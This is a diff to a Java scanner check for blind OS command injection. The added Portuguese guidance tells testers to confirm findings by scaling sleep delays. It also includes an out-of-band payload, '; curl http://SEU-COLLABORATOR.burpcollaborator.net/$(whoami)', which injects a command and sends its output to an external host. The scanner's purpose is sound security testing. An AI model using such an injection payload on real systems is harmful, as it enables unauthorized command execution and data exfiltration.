@@ -77,7 +77,12 @@ public class OsCommandInjectionCheck implements VulnCheck {
                                     "Payload: " + payload + " | Baseline: " + tempoBaseline + "ms | Tentativa 1: " + tempo1
                                             + "ms | Tentativa 2 (confirmação): " + tempo2 + "ms",
                                     "Nunca passe entrada do usuário para funções que executam comandos do SO (exec, system, popen...). " +
-                                            "Use APIs nativas da linguagem em vez de shell, e se for inevitável, use allowlist rígida + escaping adequado."));
+                                            "Use APIs nativas da linguagem em vez de shell, e se for inevitável, use allowlist rígida + escaping adequado.",
+                                    "1) Como é blind (sem saída visível), confirme de novo manualmente no Repeater trocando o tempo de sleep " +
+                                            "(ex: de " + SEGUNDOS_SLEEP + " para 15s) e veja se o atraso escala proporcionalmente — isso descarta coincidência de rede. " +
+                                            "2) Para extrair dados sem canal de saída, use exfiltração via DNS/HTTP out-of-band: payload tipo " +
+                                            "`; curl http://SEU-COLLABORATOR.burpcollaborator.net/$(whoami)` usando o Burp Collaborator pra " +
+                                            "confirmar execução E capturar a saída do comando. 3) Isso é RCE completo — trate como achado de prioridade máxima."));
                             break; // confirmado nesse param, não testa os outros payloads
                         }
                     }
